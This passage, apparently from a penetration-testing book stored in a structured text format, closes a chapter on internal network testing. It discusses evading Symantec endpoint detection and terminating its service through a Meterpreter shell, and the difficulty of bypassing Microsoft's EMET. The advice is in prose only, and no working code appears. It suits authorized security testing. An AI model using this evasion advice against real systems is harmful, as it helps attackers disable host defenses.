    that has to be allowed through, and in testing, it is our task to try and discover
    this and reveal the weakness. We looked at the Symantec tool and discovered that
    if we use a standard payload that has a signature on it, then we more than likely
    will get detected. If we do get a shell on a protected machine, then it is just
    a matter of identifying the service and then terminating it. This can all be done
    using the metasploit tool as long as we select Meterpreter as the payload.
  prefs: []
  type: TYPE_NORMAL
- en: Enhanced Mitigation Experience Toolkit
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: At the time of writing this book, the Enhanced Mitigation Experience Toolkit
    (EMET) tool provided from Microsoft is probably one of the toughest tools you
    might encounter on the machine. The deployment of this protection is still in
    its infancy, but if you do run across it in your testing, it can be quite challenging
    to get around. It is one of the reasons that Microsoft started supporting the
    "Bugs for Bounty" concept where they will pay for the bugs that are discovered
    in their software in their latest operating systems.
  prefs: []
  type: TYPE_NORMAL
- en: At the time of writing this book, the current version of EMET is 4.0\. If you
    run into an EMET-protected machine, you will have to come up with custom payloads
    as well as other methods to try and bypass it, but good luck! As the iterations
    of EMET continue to mature, it will be more and more difficult to get by it. The
    goal would be to stop the EMET process once the access has been gained and then
    carry out the attack; otherwise, use custom payloads and hope that you can bypass
    the EMET protection.
  prefs: []
  type: TYPE_NORMAL
- en: 'An example of the EMET configuration on my laptop is shown in the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Enhanced Mitigation Experience Toolkit](img/477-1_10_34.jpg)'
  prefs: []
  type: TYPE_IMG
- en: As the previous screenshot shows, in this configuration, there are three applications
    that have been added to the EMET tool. These applications will be operating in
    a shimmed environment to prevent them from being compromised. The EMET tool also
    has a number of applications already set for monitoring.
  prefs: []
  type: TYPE_NORMAL
- en: 'An example of some of these is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Enhanced Mitigation Experience Toolkit](img/477-1_10_35.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'You can also add applications that need to be protected by the EMET tool. To
    see which applications have been added by the user, you can type the following
    in the command prompt window:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: 'This command will show the applications that have been added and are currently
    being protected by the EMET tool. An example of this is shown in the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Enhanced Mitigation Experience Toolkit](img/477-1_10_36.jpg)'
  prefs: []
  type: TYPE_IMG
- en: As the previous screenshot shows, this machine is using EMET on Adobe Acrobat,
    Internet Explorer, and Skype. This is one of the challenges if you encounter EMET
    in your testing, your success will depend on how the administrator has configured
    it.
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this chapter, we discussed the process of testing a flat and internal network.
    We discovered that this means we do not have filters or layers that we have to
    traverse to attack the target. While this is a good thing, we also discussed that
    these machines would have a number of protection in place. We also reviewed the
    role a Vulnerability Scanner plays with respect to internal testing.
  prefs: []
  type: TYPE_NORMAL
- en: Following the introduction to the different host-based protection, we looked
    at them in more detail and in some cases, attempted a number of different techniques
    to bypass the different protection on the host that we might encounter. Specifically,
    we looked at the host firewall and the UAC settings and their impact on the testing
    results.
  prefs: []
  type: TYPE_NORMAL
- en: When we had looked at the host firewall and UAC, we moved on and briefly looked
    at the additional endpoint protections that could challenge our testing.
  prefs: []
  type: TYPE_NORMAL
- en: Finally, we closed the chapter by looking at the challenges that the EMET tool
    might present for our testing.
  prefs: []
  type: TYPE_NORMAL
- en: This concludes the chapter. You have now reviewed some of the challenges that
    you might be facing with when you are testing the flat and internal networks.
    We will next look at the testing methods when evaluating servers and services
    for weaknesses.
  prefs: []
  type: TYPE_NORMAL
